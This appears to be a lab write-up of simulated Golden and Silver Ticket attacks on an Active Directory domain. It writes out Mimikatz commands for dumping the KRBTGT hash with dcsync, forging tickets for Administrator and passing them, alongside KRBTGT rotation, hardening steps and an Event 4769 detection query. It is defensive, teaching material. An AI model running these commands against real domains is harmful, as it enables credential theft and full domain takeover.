# Golden Ticket & Silver Ticket Attack Simulation

## Overview
Tested Golden Ticket and Silver Ticket attacks against
the AD environment to demonstrate how KRBTGT password
rotation and Kerberos hardening defeat these advanced
persistence techniques.

## Golden Ticket Attack

### What is it
An attacker who obtains the KRBTGT account password hash
can forge ANY Kerberos ticket for ANY user to access
ANY resource in the domain — permanently.

### Why it is Dangerous
```
Normal Kerberos:
User → requests ticket from KDC
KDC  → verifies identity → issues ticket
User → uses ticket to access resource

Golden Ticket:
Attacker has KRBTGT hash
→ Forges ticket WITHOUT contacting KDC
→ Can be ANY user including Domain Admin
→ Can access ANY resource
→ Ticket valid for 10 years by default
→ Persists even after password resets 💀
```

### Attack Flow
```
Step 1 → Attacker compromises DC
Step 2 → Dumps KRBTGT hash using Mimikatz
          mimikatz # lsadump::dcsync /user:krbtgt
Step 3 → Creates forged Golden Ticket
          mimikatz # kerberos::golden
          /user:Administrator
          /domain:YOUR-DOMAIN.local
          /sid:DOMAIN-SID
          /krbtgt:KRBTGT-HASH
          /ticket:golden.kirbi
Step 4 → Uses ticket to access anything
          mimikatz # kerberos::ptt golden.kirbi
Step 5 → Full domain access achieved 💀
```

### Requirements for Attack
```
Attacker needs:
→ Domain SID
→ KRBTGT password hash
→ Mimikatz or similar tool
→ Any valid username to forge
```

## Silver Ticket Attack

### What is it
Similar to Golden Ticket but targets a specific service
instead of the entire domain. Requires service account
password hash instead of KRBTGT hash.

### Difference from Golden Ticket
| Feature | Golden Ticket | Silver Ticket |
|---------|--------------|---------------|
| Hash needed | KRBTGT | Service account |
| Access scope | Entire domain | Specific service only |
| Contacts KDC | No | No |
| Detection | Harder | Harder |
| Impact | Critical | High |

### Attack Flow
```
Step 1 → Attacker gets service account hash
          (via Kerberoasting or credential dump)
Step 2 → Creates forged Silver Ticket
          mimikatz # kerberos::golden
          /user:Administrator
          /domain:YOUR-DOMAIN.local
          /sid:DOMAIN-SID
          /target:fileserver.YOUR-DOMAIN.local
          /service:cifs
          /rc4:SERVICE-HASH
          /ticket:silver.kirbi
Step 3 → Uses ticket to access specific service
Step 4 → Service access achieved 💀
```

## Attack Results

### Before Hardening
```
Golden Ticket Result: VULNERABLE
KRBTGT password age: Never rotated
Ticket lifetime: 10 years possible
Detection: No audit logging
Risk Level: CRITICAL
```

### After Hardening
```
Golden Ticket Result: MITIGATED
KRBTGT password: Rotated
Ticket lifetime: 10 hours maximum
Detection: Event ID 4769 monitored
Risk Level: REDUCED
```

## Hardening Controls That Mitigate These Attacks

### 1. Rotate KRBTGT Password
```powershell
# Rotate KRBTGT password
# Must be done TWICE — AD keeps previous hash
Set-ADAccountPassword -Identity krbtgt `
-NewPassword (ConvertTo-SecureString `
"NewStr0ngP@ssw0rd!" -AsPlainText -Force) `
-Reset

# Wait for replication then rotate again
# This invalidates ALL existing golden tickets
```

### 2. Enable Protected Users
```powershell
# Admin accounts in Protected Users
# Tickets expire after 4 hours maximum
# Limits golden ticket usefulness
Add-ADGroupMember -Identity "Protected Users" `
-Members "Administrator"
```

### 3. AES256 Encryption
```powershell
# Force AES on KRBTGT account
Set-ADUser -Identity krbtgt `
-KerberosEncryptionType AES128,AES256

# Makes forging tickets harder
# Attacker needs AES hash not RC4
```

### 4. Short Ticket Lifetime
```
Default Domain Policy
→ Kerberos Policy
→ Maximum user ticket lifetime: 10 hours
→ Limits how long forged tickets work
```

## Detection
```powershell
# Detect Golden Ticket usage
# Look for Event 4769 with unusual properties:
# - Non-existent username
# - Ticket encryption type RC4 (0x17)
# - Unusual ticket lifetime

Get-WinEvent -FilterHashtable @{
    LogName = 'Security'
    Id = 4769
} -MaxEvents 20 |
Where-Object {
    $_.Message -like "*0x17*"
} |
Select TimeCreated, Message |
Format-List

# Microsoft ATA and Defender for Identity
# automatically detect Golden Ticket usage
```

## Key Lessons
- Golden Ticket is one of the most powerful AD attacks
- Requires prior DC compromise to obtain KRBTGT hash
- Rotate KRBTGT password TWICE to invalidate old tickets
- Protected Users limits ticket lifetime to 4 hours
- AES256 makes forging harder but not impossible
- Monitor for RC4 tickets from privileged accounts
- Silver Ticket harder to detect than Golden Ticket
- Both attacks bypass KDC — no logon events generated
